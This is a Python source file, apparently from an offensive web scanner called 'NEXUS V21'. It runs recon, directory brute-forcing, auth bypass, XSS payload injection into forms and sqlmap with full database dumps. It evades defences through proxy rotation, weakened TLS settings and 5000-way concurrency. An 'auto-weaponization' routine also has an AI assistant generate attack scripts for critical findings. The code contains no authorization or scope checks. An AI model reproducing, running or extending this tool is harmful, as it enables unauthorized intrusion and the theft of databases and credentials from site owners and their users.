        self.log_message.emit(f"    <span style='color:#aaa'>- [Strict Validation] Verifying: {vuln.vuln_type}...</span>")
        
        try:
            # SQL Injection Validation
            if "SQL" in vuln.vuln_type.upper():
                # For Error-Based, check for SQL syntax error markers
                indicators = ["SQL syntax", "MariaDB", "MySQL", "PostgreSQL", "error in your SQL", "ORA-0"]
                if any(ind.lower() in vuln.impact.lower() for ind in indicators):
                    return True
                # For structure leaks, check for database/table names
                if re.search(r"(information_schema|pg_catalog|sys\.databases|db_|user_)", vuln.impact, re.I):
                    return True
                return False

            # LFI/RFI Validation
            if "LFI" in vuln.vuln_type.upper() or "LOCAL FILE" in vuln.vuln_type.upper():
                indicators = ["root:x:0:0", "[extensions]", "[fonts]", "WINDIR", "/etc/passwd", "boot.ini"]
                if any(ind.lower() in vuln.impact.lower() for ind in indicators):
                    return True
                return False

            # XSS Validation
            if "XSS" in vuln.vuln_type.upper():
                # Check for the unique ID presence in the impact/evidence
                # Often the payload is <script>alert('NEXUS_XSS_ID')</script>
                if "NEXUS_" in vuln.impact or "NEXUS_" in str(getattr(vuln, 'evidence', '')):
                    return True
                # If impact contains the full reflected tag with a script pattern
                if re.search(r"<script>.*alert\(.*\)</script>", vuln.impact, re.I):
                    return True
                return False

            # Sensitive Files
            if "SENSITIVE FILE" in vuln.vuln_type.upper() or ".ENV" in vuln.vuln_type.upper():
                # Ignore generic titles, search for actual content patterns
                indicators = ["DB_PASSWORD", "AWS_ACCESS_KEY", "APP_KEY", "PORT=", "DATABASE_URL"]
                if any(ind.upper() in vuln.impact.upper() for ind in indicators):
                    return True
                return False

            # If it's just a 200 OK without specific evidence in impact, reject
            if "200 OK" in vuln.impact and len(vuln.impact) < 50:
                return False
                
            return True # Default to True for other types unless specifically filtered
            
        except:
            return False

    def _emit_finding(self, vuln):
        # Create a unique signature to prevent duplicate findings
        signature = f"{vuln.target}|{vuln.vuln_type}|{vuln.impact}"
        if signature in self.emitted_hashes:
            return # Skip duplicate finding
            
        if self.strict_validation:
            if not self._verify_integrity(vuln):
                self.log_message.emit(f"    <span style='color:#ff5555'>[!] REJECTED: False Positive detected for {vuln.vuln_type} (Status 200 is not enough)</span>")
                return

        self.emitted_hashes.add(signature)
        self.total_findings += 1
        
        # Ensure Critical and High get weaponized
        if vuln.severity in ["CRITICAL", "HIGH"]: 
            if vuln.severity == "CRITICAL": self.critical_findings += 1
            
            # Populate a generic comando_direto if empty, before AI might override it
            if not vuln.comando_direto:
                if "SQL" in vuln.vuln_type.upper():
                    vuln.comando_direto = f"sqlmap -u \"{vuln.target}\" --batch --dbs"
                elif "XSS" in vuln.vuln_type.upper():
                    vuln.comando_direto = f"powershell -c \"Start-Process '{vuln.target}'\"" # Just open it
                elif "LFI" in vuln.vuln_type.upper():
                    vuln.comando_direto = f"curl -v \"{vuln.target}\""

            # AUTO-WEAPONIZE CRITICAL FINDINGS (AI Powered)
            if self.ai_assistant and vuln.severity == "CRITICAL":
                 asyncio.create_task(self._weaponize_critical_vuln(vuln))
                  
        self.finding_found.emit(vuln)
        self.stats_updated.emit(self.total_findings, self.critical_findings, self.request_count)

    async def _weaponize_critical_vuln(self, vuln):
        """Triggers a targeted weaponization attack chain for a specific critical finding."""
        if not self.ai_assistant: return
        
        self.log_message.emit(f"<span style='color:#ff00ff'>[!] TRIGGERING AUTO-WEAPONIZATION for {vuln.vuln_type}...</span>")
        
        try:
             # If it's a URL-based finding, we need to fetch some context first or just pass the URL
             # For deep attack chain, it usually wants HTML content.
             # We can try to fetch the page content of the vulnerable URL
             async with self.session.get(vuln.target, timeout=10) as r:
                  content = await r.text()
                  
             # Execute Deep Attack Chain
             # This will result in a weaponized script
             finding_info = f"Type: {vuln.vuln_type}, Target: {vuln.target}, Impact: {vuln.impact}"
             script = await self.ai_assistant.deep_attack_chain(vuln.target, content, finding_details=finding_info)
             
             if script and "ERROR" not in script:
                  self.log_message.emit(f"<span style='color:#00ff9d'>[⚔️] WEAPONIZED PAYLOAD READY for {vuln.vuln_type}</span>")
                  safe_script = script.replace('"', '\\"') if script else ""
                  vuln.comando_direto = f"node -e \"{safe_script}\"" if "XSS" in vuln.vuln_type else script
                  self.payload_generated.emit(vuln.target, script)
                  
                  # If we have an active browser session in run_scan, we could inject it.
                  # But since run_scan manages BrowserScanner instances locally in the loop, 
                  # we emit it so the user can run it from the Payloads tab.
             else:
                  self.log_message.emit(f"<span style='color:#ff5555'>[!] Weaponization failed for {vuln.vuln_type}</span>")
                  
        except Exception as e:
             self.log_message.emit(f"<span style='color:#ff5555'>[!] Weaponization Error: {str(e)}</span>")

    async def run_scan(self):
        try:
            self.is_running = True
            
            # Initialize Proxy Manager if in Bypass Mode
            if self.bypass_mode:
                self.log_message.emit("<span style='color:#00f3ff'>[*] Initializing Proxychains (Free Proxy Rotation)...</span>")
                await self.proxy_manager.initialize()
                
            # Governor mode TLS Fingerprinting Bypass Support
            ssl_context = False
            if getattr(self, 'governor_mode', False):
                import ssl
                ssl_context = ssl.create_default_context()
                ssl_context.check_hostname = False
                ssl_context.verify_mode = ssl.CERT_NONE
                ssl_context.set_ciphers('DEFAULT@SECLEVEL=1') # Lower seclevel to connect to weak legacy systems
                ssl_context.options |= ssl.OP_NO_TLSv1 | ssl.OP_NO_TLSv1_1 # Force modern
                
            # [GOVERNMENTAL PERFORMANCE] Maximize Pipeline
            if self.auto_tune:
                self.log_message.emit("<span style='color:#aa00ff'>[GOV] Auto-Tune Active: Unlocking TCP/HTTP Limits (5000+ Concurrency)</span>")
                connector = aiohttp.TCPConnector(
                    ssl=ssl_context, 
                    limit=5000,           # Global concurrent limit
                    limit_per_host=5000,  # Maximize attack surface per target 
                    keepalive_timeout=60  # Keep sockets warm for speed
                )
            else:
                connector = aiohttp.TCPConnector(ssl=ssl_context, limit=100) 

            self.session = aiohttp.ClientSession(
                connector=connector,
                read_bufsize=65536,
                trust_env=True, 
                timeout=aiohttp.ClientTimeout(total=45 if not self.dynamic_timeout else 10)
            )
            
            self.log_message.emit("<h3 style='color:#00ff9d'>[*] INITIALIZING NEXUS V21 CORE...</h3>")
            self.log_message.emit(f"[*] Engine: Asyncio + Semaphore(50) | Bypass Mode: {self.bypass_mode}")
            self.log_message.emit("[*] Auto-Evidence Collection: ENABLED")
            
            scan_list = self.targets.copy()
            total_targets = len(scan_list)
            
            for i, target in enumerate(scan_list):
                if not self.is_running: break
                url = target['url']
                hostname = urlparse(url).hostname
                
                self.log_message.emit(f"<br><span style='color:#00f3ff; font-weight:bold'>[+] ANALYZING TARGET: {url}</span>")
                
                # WAF Detection
                await self.check_waf(url)
                

                # DNS Recon
                ips = self.resolve_domain(hostname)
                if ips: 
                    self.log_message.emit(f"<span style='color:#aaa'>    - DNS Resolution: {', '.join(ips)}</span>")
                    
                    # DIRECT IP ANALYSIS
                    import ipaddress
                    for ip in ips:
                        try:
                            ip_obj = ipaddress.ip_address(ip)
                            if not ip_obj.is_private:
                                self.log_message.emit(f"<span style='color:#00f3ff'>[*] Analyzing Public IP: {ip}</span>")
                                # 1. Geolocation (Simulated or via API if available, here just log)
                                # 2. Direct IP Access Check (Misconfigured VHosts)
                                async def check_direct_ip():
                                    try:
                                        # Try HTTP/HTTPS access to IP
                                        for proto in ['http', 'https']:
                                            target_ip = f"{proto}://{ip}"
                                            s, c, h, l = await self._safe_request('GET', target_ip, timeout=5, verify_ssl=False)
                                            if s == 200:
                                                self.log_message.emit(f"<span style='color:#ffcc00'>[!] Direct IP Access Allowed: {target_ip} (Potential Info Leak)</span>")
                                                self.save_evidence(target_ip, "Direct_IP_Access", c)
                                                
                                                # Check for default pages
                                                lower_c = c.decode('utf-8', errors='ignore').lower()
                                                if "apache2 ubuntu default page" in lower_c or "iis windows server" in lower_c:
                                                     self.log_message.emit(f"<span style='color:#ffcc00'>[!] Default Server Page Detected on {ip}</span>")
                                    except: pass
                                
                                asyncio.create_task(check_direct_ip())
                                
                                # 3. Port Scan on IP (Parallel to domain scan)
                                asyncio.create_task(self.scan_ports(ip))
                        except: pass
                
                # Subdomain Enumeration
                ext = tldextract.extract(hostname)
                root_domain = f"{ext.domain}.{ext.suffix}"
                
                # 1. CRT.SH
                await self.enumerate_subdomains(root_domain)
                
                # 2. HackerTarget
                ht = HackerTargetEnumerator(root_domain)
                ht_subs = await ht.run()
                if ht_subs:
                     self.log_message.emit(f"<span style='color:#00ff9d'>[+] DISCOVERED {len(ht_subs)} SUBDOMAINS (HACKERTARGET):</span>")
                     for sub in ht_subs[:15]:
                          self.log_message.emit(f"<span style='color:#aaa'>    - {sub}</span>")
                          asyncio.create_task(self.check_takeover(sub))
                     if len(ht_subs) > 15:
                          self.log_message.emit(f"<span style='color:#aaa'>    - ... and {len(ht_subs)-15} more.</span>")
                     self.save_evidence(f"https://{root_domain}", "Subdomain_Recon_HT", "\n".join(sorted(ht_subs)))
                
                # Port Scanning is already handled via Direct IP Analysis (Async)
                # await self.scan_ports(hostname) -- REMOVED TO PREVENT DUPLICATES
                
                # Tech Detection & CMS
                tech_stack = await self.detect_tech(url)
                cms = await self.detect_cms(url)
                if cms:
                    self.log_message.emit(f"<span style='color:#ffcc00'>    - CMS DETECTED: {cms.upper()}</span>")
                    tech_stack.append(cms)
                
                if tech_stack: 
                    self.log_message.emit(f"<span style='color:#ffcc00'>    - Technology Stack: {', '.join(tech_stack).upper()}</span>")
                
                await self.check_sensitive_files(url)
                await self.check_balance_tampering(url)
                
                # Governor Mode GraphQL Dump
                if getattr(self, 'governor_mode', False):
                    asyncio.create_task(self._dump_graphql(url))
                
                # Cloud Bucket Enum
                if self.targets and "domain" in self.targets[0]: # heuristic
                     pass # Already handled in enumerate_subdomains
                
                # 6. Auth Bypass & Privilege Escalation (aggressive)
                if self.bypass_mode and self.discovered_forms:
                    try:
                        from core.auth_bypass import AuthBypassEngine
                        auth_engine = AuthBypassEngine(self.session)
                        auth_engine.finding_found.connect(self._emit_finding)
                        auth_engine.log_message.connect(self.log_message.emit)
                        await auth_engine.run(url, self.discovered_forms)
                    except ImportError:
                        pass
                
                # Directory / Hidden File Brute Force
                try:
                    from core.directory_bruter import DirectoryBruter
                    bruter = DirectoryBruter(self.session, strict_validation=self.strict_validation)
                    bruter.finding_found.connect(self._emit_finding)
                    bruter.log_message.connect(self.log_message.emit)
                    await bruter.run(url)
                except ImportError:
                    self.log_message.emit("<span style='color:#ff0000'>[!] Directory module missing. Skipping.</span>")

                # CVE Scanner
                cve_scanner = CVEScanner(self.session)
                cve_scanner.finding_found.connect(self._emit_finding)
                cve_scanner.log_message.connect(self.log_message.emit)
                await cve_scanner.scan(url)
                
                # Browser-Based Scan (Playwright)
                try:
                    browser_scanner = BrowserScanner(
                        url, 
                        deep_scan=self.deep_scan, 
                        headless=self.headless,
                        ai_key=self.ai_key,
                        ai_model=self.ai_model
                    )
                    # Connect signals
                    browser_scanner.log_message.connect(self.log_message.emit)
                    browser_scanner.finding_found.connect(self._emit_finding)
                    browser_scanner.payload_generated.connect(self.payload_generated.emit)
                    
                    # Capture forms for Auth Engine
                    browser_scanner.forms_found.connect(lambda forms: self.discovered_forms.extend(forms))
                    
                    # Start Browser Session
                    await browser_scanner.initialize()
                    
                    # Scan Main Target
                    await browser_scanner.scan_page(url)
                    
                    if self.deep_scan:
                        # Spider/Crawl logic
                        if self.deep_scan:
                             await browser_scanner._spider_links()

                        crawler = WebCrawler(url)
                        fuzz_targets = await crawler.crawl(self.session, depth=2)
                        self.log_message.emit(f"<span style='color:#aaa'>    - Crawler discovered {len(fuzz_targets)} endpoints.</span>")
                        
                        # SYSTEMATIC ASSET ANALYSIS (New Phase)
                        # Combine crawled pages + discovered assets (JS/CSS)
                        all_analysis_targets = set(fuzz_targets)
                        if crawler.assets:
                            self.log_message.emit(f"<span style='color:#00ff9d'>[+] Crawler found {len(crawler.assets)} static assets (JS/CSS). Analyzing for secrets...</span>")
                            all_analysis_targets.update(crawler.assets)
                        
                        if all_analysis_targets:
                             self.log_message.emit(f"<span style='color:#00f3ff'>[*] Performing Static Analysis on {len(all_analysis_targets)} assets...</span>")
                             
                             async def analyze_asset(asset_url):
                                  try:
                                       s, c, _, _ = await self._safe_request('GET', asset_url, timeout=5)
                                       if c:
                                            self.extract_sensitive_data(c.decode('utf-8', errors='ignore'), asset_url)
                                  except:
                                       pass

                             # Batch process assets
                             analyze_tasks = [analyze_asset(u) for u in all_analysis_targets if not u.endswith(('.png', '.jpg', '.jpeg', '.gif', '.woff', '.woff2', '.ttf', '.svg', '.ico'))] 
                             # (Skip images/fonts)
                             
                             for i in range(0, len(analyze_tasks), 20):
                                  if not self.is_running: break
                                  await asyncio.gather(*analyze_tasks[i:i+20])

                        if crawler.login_pages:
                             self.log_message.emit(f"<span style='color:#ffcc00'>[!] Discovered {len(crawler.login_pages)} Login/Password Interfaces. Prioritizing...</span>")

                        # Scan discovered endpoints with Browser (Efficiency: Limit to 15 interesting ones to avoid timeout)
                        # Priority: Login Pages > Admin Pages > Parameter Pages
                        interesting_endpoints = list(crawler.login_pages)
                        
                        for u in fuzz_targets:
                            if u not in interesting_endpoints and len(interesting_endpoints) < 15:
                                 if "?" in u or "admin" in u or "login" in u:
                                      interesting_endpoints.append(u)
                        
                        if interesting_endpoints:
                            self.log_message.emit(f"<span style='color:#00f3ff'>[*] Deep Browser Analysis on {len(interesting_endpoints)} optimized targets...</span>")
                            for endpoint in interesting_endpoints:
                                 if not self.is_running: break
                                 await browser_scanner.scan_page(endpoint)
                        
                        # Standard Fuzzing
                        for f_url in fuzz_targets:
                            if not self.is_running: break
                            await self.fuzz_parameters(f_url, tech_stack)
                    
                    # Ensure aborted scans don't bleed into new logic
                    if not self.is_running: 
                        break

                    # -----------------------------------------------------
                    # AUTOMATED SQL, XSS, and OWASP ENGINE INJECTION
                    # -----------------------------------------------------
                    if self.deep_scan:
                        self.log_message.emit("<br><span style='color:#ff00ff'>[☠️] INITIATING OWASP TOP 10, SQLMAP & XSS AUTOMATION...</span>")
                        
                        # XSS Automated Scan
                        self.log_message.emit(f"<span style='color:#00f3ff'>[*] Starting Global XSS Injection on {url}...</span>")
                        await self._run_xss_scan(url)
                        
                        # SQLMap Engine Integration
                        self.log_message.emit(f"<span style='color:#00f3ff'>[*] Starting SQLMap Auto-Dump Engine on {url}...</span>")
                        await self._run_sqlmap_scan(url)
                    # -----------------------------------------------------
                    
                    # Close Browser Session
                    await browser_scanner.stop()

                except Exception as e:
                    self.log_message.emit(f"<span style='color:#ff0000'>[!] Browser Module Failed: {str(e)}</span>")

                progress = int(((i + 1) / total_targets) * 100)
                self.progress_updated.emit(progress)
        
        except Exception as e:
             self.log_message.emit(f"<span style='color:#ff0000'>[!] CRITICAL SCANNER ERROR: {str(e)}</span>")
             import traceback
             traceback.print_exc()
        finally:
             if self.session:
                 await self.session.close()
             self.log_message.emit("<br><h3 style='color:#00ff9d'>[+] SCAN COMPLETE.</h3>")
             self.scan_finished.emit()
             self.is_running = False

    def stop_scan(self):
        self.is_running = False
        self.log_message.emit("<span style='color:#ff0055'>[!] SCAN ABORTED BY USER.</span>")

    async def detect_cms(self, url):
        """Detects common CMS using heuristic checks."""
        try:
            status, content, _, _ = await self._safe_request('GET', url, headers=self.get_headers())
            text = content.decode('utf-8', errors='ignore').lower()
            
            if "wp-content" in text or "wp-includes" in text: return "wordpress"
            if "joomla!" in text or "/templates/" in text: return "joomla"
            if "drupal" in text or "sites/all/themes" in text: return "drupal"
            if "magento" in text or "mage/" in text: return "magento"
            if "shopify" in text: return "shopify"
            if "wix.com" in text: return "wix"
            if "squarespace" in text: return "squarespace"
            
            return None
        except:
            return None

    # ==========================================
    # DEEP GRAPHQL ANALYSIS
    # ==========================================
    async def _dump_graphql(self, base_url):
        """Tries to discover and auto-dump GraphQL schemas for Governor Mode."""
        parsed = urlparse(base_url)
        # Common GQL endpoints
        endpoints = ["/graphql", "/api/graphql", "/v1/graphql", "/v2/graphql", "/query"]
        
        introspection_query = '''{"query":"\\n    query IntrospectionQuery {\\n      __schema {\\n        queryType { name }\\n        mutationType { name }\\n        subscriptionType { name }\\n        types {\\n          ...FullType\\n        }\\n        directives {\\n          name\\n          description\\n          locations\\n          args {\\n            ...InputValue\\n          }\\n        }\\n      }\\n    }\\n\\n    fragment FullType on __Type {\\n      kind\\n      name\\n      description\\n      fields(includeDeprecated: true) {\\n        name\\n        description\\n        args {\\n          ...InputValue\\n        }\\n        type {\\n          ...TypeRef\\n        }\\n        isDeprecated\\n        deprecationReason\\n      }\\n      inputFields {\\n        ...InputValue\\n      }\\n      interfaces {\\n        ...TypeRef\\n      }\\n      enumValues(includeDeprecated: true) {\\n        name\\n        description\\n        isDeprecated\\n        deprecationReason\\n      }\\n      possibleTypes {\\n        ...TypeRef\\n      }\\n    }\\n\\n    fragment InputValue on __InputValue {\\n      name\\n      description\\n      type { ...TypeRef }\\n      defaultValue\\n    }\\n\\n    fragment TypeRef on __Type {\\n      kind\\n      name\\n      ofType {\\n        kind\\n        name\\n        ofType {\\n          kind\\n          name\\n          ofType {\\n            kind\\n            name\\n            ofType {\\n              kind\\n              name\\n              ofType {\\n                kind\\n                name\\n                ofType {\\n                  kind\\n                  name\\n                  ofType {\\n                    kind\\n                    name\\n                  }\\n                }\\n              }\\n            }\\n          }\\n        }\\n      }\\n    }\\n  "}'''

        for path in endpoints:
            target = f"{parsed.scheme}://{parsed.netloc}{path}"
            headers = self.get_headers()
            headers["Content-Type"] = "application/json"
            
            s, c, _, _ = await self._safe_request('POST', target, headers=headers, data=introspection_query, timeout=5)
            if s == 200 and c:
                try:
                    import json
                    resp = json.loads(c.decode('utf-8'))
                    if "data" in resp and "__schema" in resp["data"]:
                        self.log_message.emit(f"<span style='color:#ff0055; font-weight:bold'>[Governor] CRITICAL: GraphQL Introspection Enabled at {target}!</span>")
                        self.save_evidence(target, "GraphQL_Schema_Dump", c)
                        vuln = Vulnerability(target=target, vuln_type="GraphQL Introspection Enabled", severity="HIGH", impact="Full API schema dumped to evidence folder.")
                        self._emit_finding(vuln)
                        break # Successfully found and dumped
                except: pass

    # ==========================================
    # AUTOMATED INJECTION ENGINES
    # ==========================================
    async def _run_sqlmap_scan(self, url):
        """Native SQLi automation with auto dump to scans/dumps/"""
        import sys, os
        sqlmap_path = os.path.join(os.getcwd(), "sqlmap-master", "sqlmap.py")
        if not os.path.exists(sqlmap_path):
            self.log_message.emit(f"<span style='color:#ff0055'>[!] SQLMap Engine not found at {sqlmap_path}. Skipping SQLi automation.</span>")
            return
            
        parsed = urlparse(url)
        safe_hostname = "".join([c if c.isalnum() or c in ".-" else "_" for c in parsed.hostname])
        
        # Specific user requirement: dump to scan/dumps/ folder
        dump_dir = os.path.join(os.getcwd(), "scans", "dumps", safe_hostname)
        os.makedirs(dump_dir, exist_ok=True)
        
        # Automated SQLMap sequence for all endpoints
        cmd = [
            sys.executable, sqlmap_path, "-u", url, 
            "--batch", "--forms", "--crawl=2", "--dump", 
            "--output-dir", dump_dir, "--random-agent", "--level=1", "--risk=1", 
            "--threads=2"
        ]
        
        self.log_message.emit(f"<span style='color:#aaa'>    - Executing SQLMap background agent...</span>")
        
        try:
            process = await asyncio.create_subprocess_exec(
                *cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.STDOUT
            )
            
            found_sqli = False
            
            # Read stdout asynchronously without freezing GUI
            while True:
                if not self.is_running:
                    process.terminate()
                    break
                    
                line = await process.stdout.readline()
                if not line: break
                
                decoded = line.decode('utf-8', errors='ignore').strip().lower()
                
                if ("is vulnerable" in decoded or "is injectable" in decoded or "' injectable" in decoded) and "not " not in decoded:
                    found_sqli = True
                    self.log_message.emit(f"<span style='color:#ff0055; font-weight:bold'>[!] SQL INJECTION FOUND: {decoded.upper()}</span>")
                elif "retrieved:" in decoded or "dumped to csv file" in decoded:
                    self.log_message.emit(f"<span style='color:#00ff9d'>[☠️] DATABASE EXTRACTION SUCCESS: {decoded.upper()}</span>")
                elif "warning" in decoded or "error" in decoded:
                    self.log_message.emit(f"<span style='color:#aaaaaa'>[SQLMap] {decoded.capitalize()}</span>")
                    
            await process.wait()
            
            if found_sqli:
                 vuln = Vulnerability(target=url, vuln_type="SQL Injection (SQLMap Automated)", severity="CRITICAL", impact=f"Data dumped to {dump_dir}")
                 self._emit_finding(vuln)
                 self.log_message.emit(f"<span style='color:#ff00ff'>[+] SQLMap execution finished. DUMPS SAVED IN: {dump_dir}</span>")
            else:
                 self.log_message.emit(f"<span style='color:#aaa'>    - SQLMap finished. No automated exploitation possible.</span>")
                 
        except Exception as e:
            self.log_message.emit(f"<span style='color:#ff0000'>[!] SQLMap execution error: {e}</span>")

    async def _run_xss_scan(self, url):
        """Native XSS reflection attack on discovered forms"""
        from bs4 import BeautifulSoup as bs
        from urllib.parse import urljoin
        
        xss_payloads = [
            "<script>alert('XSS')</script>",
            "\"'><script>alert('XSS')</script>",
            "<img src=x onerror=alert('XSS')>",
            "javascript:alert(1)//"
        ]
        
        status, content, _, _ = await self._safe_request('GET', url, timeout=10)
        if not content: return
        
        soup = bs(content, "html.parser")
        forms = soup.find_all("form")
        
        if not forms:
            self.log_message.emit("<span style='color:#aaa'>    - No forms found on root for XSS injection. (Crawler may find more).</span>")
            return
            
        self.log_message.emit(f"<span style='color:#ffcc00'>    - Found {len(forms)} forms. Injecting polymorphic XSS payloads...</span>")
        
        for i, form in enumerate(forms):
            if not self.is_running: break
            
            action = form.attrs.get("action", "")
            method = form.attrs.get("method", "get").lower()
            target_url = urljoin(url, action) if action else url
            
            inputs = []
            for input_tag in form.find_all("input"):
                inputs.append({
                    "type": input_tag.attrs.get("type", "text"),
                    "name": input_tag.attrs.get("name")
                })
                
            for payload in xss_payloads:
                if not self.is_running: break
                
                data = {}
                valid_input = False
                for inp in inputs:
                    if inp.get("name"):
                        if inp["type"] in ["text", "search", "email", "password"]:
                            data[inp["name"]] = payload
                            valid_input = True
                        else:
                            data[inp["name"]] = "test"
                            
                if not valid_input: continue
                
                try:
                    if method == "post":
                        s, c, h, l = await self._safe_request('POST', target_url, data=data, timeout=5)
                    else:
                        s, c, h, l = await self._safe_request('GET', target_url, params=data, timeout=5)
                    
                    if c and payload.encode() in c:
                        vuln = Vulnerability(target=target_url, vuln_type="Cross-Site Scripting (Reflected XSS)", severity="HIGH", impact=f"Payload Reflected: {payload[:25]}")
                        self._emit_finding(vuln)
                        self.log_message.emit(f"<span style='color:#ff0055'>[!] VULNERABLE TO XSS: {target_url} (Payload executed)</span>")
                        self.save_evidence(target_url, "XSS_Reflection", c)
                        break # Found vulnerability on this form, break payload loop to save time
                except Exception: 
                    pass
